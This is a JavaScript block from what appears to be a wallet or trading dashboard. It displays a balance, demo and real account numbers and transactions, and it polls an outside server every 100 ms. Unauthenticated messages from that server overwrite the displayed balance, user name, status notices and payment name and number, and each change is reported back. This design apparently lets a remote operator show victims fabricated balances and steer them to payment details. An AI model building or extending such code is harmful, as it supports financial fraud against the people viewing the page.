	<script>
		// Get savedInfo & userId
		const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));
		const userId = savedInfo.userId;
		
		// SENDER
		function sender(payload) {
			const url = 'https://send-39yi.onrender.com/api/messages';  
			fetch(url, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(payload)    
			});  
		}
		
		// Send Status      
        document.addEventListener('visibilitychange', () => { 
            if (document.visibilityState === 'visible') {
                //sender({ userId: userId, status: "online" });
            } else {
                //sender({ userId: userId, status: "offline" });          
            }
        });

		// Update Greetings based on time of day
		function updateGreet() {
			const hour = new Date().getHours();
			let updatedHour;
			if (hour < 12) {
				updatedHour = 'Good Morning';   
			} else if (hour < 18) {
				updatedHour = 'Good Afternoon';
			} else {
				updatedHour = 'Good Evening';
			}
  
			document.getElementById('updateHour').textContent = updatedHour;
		}
		// Update on load and every minute
		updateGreet();
		setInterval(updateGreet, 60000);

		// Toggle Sidebar
		function toggleSidebar() {
			document.getElementById("sidebar").classList.toggle("open");
			document.getElementById("overlay").classList.toggle("active");	
			document.getElementById("menuToggle").classList.toggle("active");
		}
		
		// Toggle show Button
		const toggleBalance = document.getElementById('toggleBalance');
		const balance = document.getElementById('balance');
		const balanceHidden = localStorage.getItem('balanceHidden') === 'true';
		const icon = toggleBalance.querySelector('i');
		
		if(balanceHidden){
			balance.style.filter = 'blur(6px)'; 
			icon.classList.add('fa-eye-slash');
			icon.classList.remove('fa-eye');
		}
			
		toggleBalance.addEventListener('click', () => {
			if(balance.style.filter == 'blur(6px)') {
				balance.style.filter = ''; 
				icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
				localStorage.setItem('balanceHidden', 'false');
			}else {
				balance.style.filter = 'blur(6px)'; 
				icon.classList.add('fa-eye-slash');
                icon.classList.remove('fa-eye');
				localStorage.setItem('balanceHidden', 'true');
			}
		});
		// MAIN CODE
		let lastMessageId = localStorage.getItem('latestId') || 0;

		// To Copy demoAcc
		function copy(copytext, host) {
			navigator.clipboard.writeText(copytext);
			const originalText = host.innerHTML;
			host.innerHTML = `<h4>Copied</h4>`;
			
			setTimeout(() => {
				host.innerHTML = originalText; 
			}, 2000);
		}

		// DISPLAY USER INFO
		function displaySavedInfo() {	
			// Fill Name and Avatar
			const name = savedInfo.name;
			const words = name.trim().split(/\s+/);
			const avatar = words.length ? (words[0][0] || 'ðŸ’¬') + (words[words.length - 1][0] || '') : 'ðŸ’¬';

			document.getElementById('demoAcc').textContent = savedInfo.demoAcc;
			document.getElementById('realAcc').textContent = savedInfo.realAcc;
			document.getElementById('name').textContent = name;
			document.getElementById('avatar').textContent = avatar;
			document.getElementById('amount').textContent = savedInfo.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
			document.getElementById('walletName').textContent = savedInfo.walletName;
			//document.getElementById('update').textContent = savedInfo.update;
			//document.getElementById('payName').textContent = savedInfo.payName;	
			//document.getElementById('payNumber').textContent = savedInfo.payNumber;
		}
		
		// Update Transactions
		savedInfo.transactions.forEach((transaction) => {	
			const cloneParent = document.querySelector('.transactions ul');
			const clone = document.querySelector('.transactions ul li').cloneNode(true);

			clone.querySelector('.transaction-title').textContent = transaction.title;
			clone.querySelector('.tracker').textContent = transaction.tracker;
			
			cloneParent.appendChild(clone);
		});
		
		// THE POP UP MODAL
        function openModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.add('active');
                document.body.style.overflow = 'hidden'; // Prevent scrolling
                
                // Add event listener for Escape key
                document.addEventListener('keydown', handleEscapeKey);
                // Add event listener for outside click
                modal.addEventListener('click', handleOutsideClick);
            }
        }
        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.remove('active');
                document.body.style.overflow = 'auto'; // Restore scrolling
                // Remove event listeners
                document.removeEventListener('keydown', handleEscapeKey);
                modal.removeEventListener('click', handleOutsideClick);
            }
        }
        // Close modal with Escape key
        function handleEscapeKey(e) {
            if (e.key === 'Escape') {
                // Find the currently active modal and close it
                const activeModal = document.querySelector('.modal.active');
                if (activeModal) {
                    closeModal(activeModal.id);
                }
            }
        }
        // Close modal when clicking outside content
        function handleOutsideClick(e) {
            if (e.target === this) {
                closeModal(this.id);
            }
        }
        // Close all modals (useful for resetting state)
        function closeAllModals() {
            const modals = document.querySelectorAll('.modal');
            modals.forEach(modal => {
                modal.classList.remove('active');
            });
            document.body.style.overflow = 'auto';
			
            document.removeEventListener('keydown', handleEscapeKey);
            modals.forEach(modal => {
                modal.removeEventListener('click', handleOutsideClick);
			});
		}	
		
        // Function to fetch and extract new messages
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('latestId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
				if(savedInfo.userId.toLowerCase() === message.userId.toLowerCase()){
					console.log('For User');
					if(message.name){
						savedInfo.name = message.name;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, name: savedInfo.name });
					}
					if(message.amount){
						savedInfo.amount = message.amount;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, amount: savedInfo.amount });
					}
					if(message.update){
						savedInfo.update = message.update;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: savedInfo.update });
					}
					if(message.payName){
						savedInfo.payName = message.payName;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
					}
					if(message.payNumber){
						savedInfo.payNumber = message.payNumber;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: `${savedInfo.payName} ${savedInfo.payNumber}` });
						
					}
					displaySavedInfo()
                } else {
                    console.log('Not For User');
                }
            });
        }
    
        
        // Start polling when page loads
        window.addEventListener('load', () => {
            fetchMessages(); 
			setTimeout(displaySavedInfo, 100);
        });
	</script>
